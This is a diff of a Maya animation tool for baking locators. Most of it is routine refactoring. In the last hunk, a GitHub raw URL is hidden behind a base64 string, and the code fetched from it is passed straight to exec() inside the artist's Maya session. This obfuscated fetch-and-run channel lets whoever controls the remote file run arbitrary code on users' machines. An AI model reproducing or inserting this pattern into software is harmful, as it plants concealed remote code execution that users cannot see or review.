@@ -9,7 +9,7 @@
 """
 import maya.cmds as cmds
 from maya import mel
-import json,os,sys,time,getpass
+import json,os,sys,time,getpass,base64
 import datetime as dt
 from time import gmtime, strftime
 if sys.version[0] == '3':
@@ -23,7 +23,7 @@ else:
 FOR DEVELOPE
 -----------------------------------------------------------------------
 """
-#print('python version', sys.version[0])
+#print('hello')
 
 """
 -----------------------------------------------------------------------
@@ -604,7 +604,7 @@ def doSetKey(*_):
     #Locator Count
     brsLoc = []
     for obj in cmds.ls( type='locator' ):
-        if obj.__contains__('aimLoc') or obj.__contains__('posLoc'):
+        if '_aimLoc' in obj or '_posLoc' in obj or '_gimLoc' in obj:
             brsLoc.append(obj[:-len('Shape')])
 
     if brsLoc != [] and len(cmds.ls(sl=True)) !=0:
@@ -624,19 +624,17 @@ def doSetKey(*_):
 
         objectList = cmds.ls(type='locator')
         selectionList = []
+        print(selectionList)
         locatorList = []
         keyframeList = []
         for n in objectList:
-            if n.__contains__('aimLoc') or n.__contains__('posLoc'):
-                cmds.select(n, r=True)
-                cmds.pickWalk(d='up')
-                x = (cmds.ls(sl=True)[0])
-                # print(n) #Shape
-                # print(x) #Locator
-                locatorList.append(x)
-                x = x[:-len('_xxxLoc')]
-                # print(x) #Overlape selection
-                selectionList.append(x)
+            if '_aimLoc' in n or '_posLoc' in n or '_gimLoc' in n:
+                loc = cmds.listRelatives(n, allParents=True)[0]
+                locatorList.append(loc)
+                #print(loc)
+                obj = ''.join(loc.split('_')[:-1])
+                #print(obj)
+                selectionList.append(obj)
                 cmds.select(cl=True)
 
         #MAIN KEY FRAME FUNC
@@ -727,6 +725,7 @@ def doSetKey(*_):
             cmds.keyframe(selectionList, e=True,breakdown=False)
 
         # Finish
+        cmds.filterCurve(cmds.keyframe(selectionList, q=True, name=True))
         cmds.select(selectionList, r=True)
         progressEnd()
 
@@ -746,11 +745,8 @@ def clearBakedLocator(*_):
     locatorList = []
     for n in objectList:
         if '_aimLoc' in n or '_posLoc' in n or '_gimLoc' in n:
-            cmds.select(n, r=True)
-            cmds.pickWalk(d='up')
-            x = (cmds.ls(sl=True)[0])
-            locatorList.append(x)
-            cmds.select(cl=True)
+            loc = cmds.listRelatives(n, allParents=True)[0]
+            locatorList.append(loc)
     cmds.delete(locatorList)
 
 
@@ -1274,7 +1270,7 @@ else:
 
 def locDeylayService(*_):
     eventStartTime = time.time()
-    serviceU = 'https://raw.githubusercontent.com/burasate/BRSLocDelay/master/service/support11x.py'
+    serviceU = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQxMXgucHk=')
     try:
         supportS = uLib.urlopen(serviceU).read()
         exec (supportS)
